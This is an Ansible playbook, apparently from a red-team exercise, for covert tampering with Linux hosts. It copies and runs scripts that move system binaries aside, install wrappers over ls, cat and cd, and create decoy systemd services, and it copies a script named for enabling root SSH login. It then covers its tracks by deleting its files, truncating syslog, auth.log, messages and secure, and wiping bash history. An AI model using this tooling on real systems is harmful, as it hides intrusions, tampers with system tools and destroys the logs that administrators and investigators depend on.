---
- name: Deploy stealth wrappers, decoys, and clean up on Linux hosts
  hosts: linux
  become: yes
  gather_facts: yes

  vars:
    deploy_dir: /tmp/tools   # Remote directory for temporary deployment
    purge_logs: true                # Set to true to clear logs and bash history

  tasks:
    ###################################################################
    # 1) Prepare: Create the deployment directory
    ###################################################################
    - name: Create remote deployment directory
      file:
        path: "{{ deploy_dir }}"
        state: directory
        mode: "0755"

    - name: install which to Rocky 9
      dnf:
        name: which
        state: present
      when: inventory_hostname in ['triceratops1', 'triceratops2'] 


    ###################################################################
    # 2) Copy required scripts from the Linux folder
    ###################################################################
    - name: Copy move_binaries.sh
      copy:
        src: ../Linux/move_binaries.sh
        dest: "{{ deploy_dir }}/move_binaries.sh"
        mode: "0755"

    - name: Copy wrapper_deploy.sh
      copy:
        src: ../Linux/wrapper_deploy.sh
        dest: "{{ deploy_dir }}/wrapper_deploy.sh"
        mode: "0755"

    - name: Copy decoy_deploy.sh
      copy:
        src: ../Linux/decoy_deploy.sh
        dest: "{{ deploy_dir }}/decoy_deploy.sh"
        mode: "0755"

    - name: Copy wrap_cat.sh
      copy:
        src: ../Linux/wrapper/wrap_cat.sh
        dest: "{{ deploy_dir }}/wrap_cat.sh"
        mode: "0755"

    - name: Copy wrap_cd.sh
      copy:
        src: ../Linux/wrapper/wrap_cd.sh
        dest: "{{ deploy_dir }}/wrap_cd.sh"
        mode: "0755"

    - name: Copy wrap_ls.sh
      copy:
        src: ../Linux/wrapper/wrap_ls.sh
        dest: "{{ deploy_dir }}/wrap_ls.sh"
        mode: "0755"

    - name: Copy jvage.sh
      copy:
        src: ../Linux/on_their_system/jvage.sh
        dest: "{{ deploy_dir }}/jvage.sh"
        mode: "0755"

    - name: Copy ssh_root_enable.sh
      copy:
        src: ../Linux/decoy/ssh_root_enable.sh
        dest: "{{ deploy_dir }}/ssh_root_enable.sh"
        mode: "0755"

    ###################################################################
    # 3) Run the deployment scripts in order
    ###################################################################
    - name: Run move_binaries.sh to back up system binaries
      command: "{{ deploy_dir }}/move_binaries.sh"
      args:
        chdir: "{{ deploy_dir }}"

    - name: Run wrapper_deploy.sh to install the wrappers (ls, cat, cd)
      command: "{{ deploy_dir }}/wrapper_deploy.sh"
      args:
        chdir: "{{ deploy_dir }}"

    - name: Run decoy_deploy.sh to create decoy systemd services
      command: "{{ deploy_dir }}/decoy_deploy.sh"
      args:
        chdir: "{{ deploy_dir }}"

    ###################################################################
    # 4) Clean up deployment artifacts and clear logs/history
    ###################################################################
    - name: Remove deployment directory
      file:
        path: "{{ deploy_dir }}"
        state: absent

    - block:
        - name: Truncate syslog (Debian/Ubuntu)
          shell: "truncate -s 0 /var/log/syslog 2>/dev/null || true"
          when: ansible_facts['os_family'] == "Debian"

        - name: Truncate auth.log (Debian/Ubuntu)
          shell: "truncate -s 0 /var/log/auth.log 2>/dev/null || true"
          when: ansible_facts['os_family'] == "Debian"

        - name: Truncate messages (Rocky/RedHat)
          shell: "truncate -s 0 /var/log/messages 2>/dev/null || true"
          when: ansible_facts['os_family'] == "RedHat"

        - name: Truncate secure (Rocky/RedHat)
          shell: "truncate -s 0 /var/log/secure 2>/dev/null || true"
          when: ansible_facts['os_family'] == "RedHat"

        - name: Clear root bash history
          shell: |
            [ -f /root/.bash_history ] && cat /dev/null > /root/.bash_history 2>/dev/null || true
            history -c 2>/dev/null || true
            history -w 2>/dev/null || true

        - name: Clear primary user's bash history (john_hammond)
          shell: |
            [ -f /home/john_hammond/.bash_history ] && cat /dev/null > /home/john_hammond/.bash_history 2>/dev/null || true
      when: purge_logs
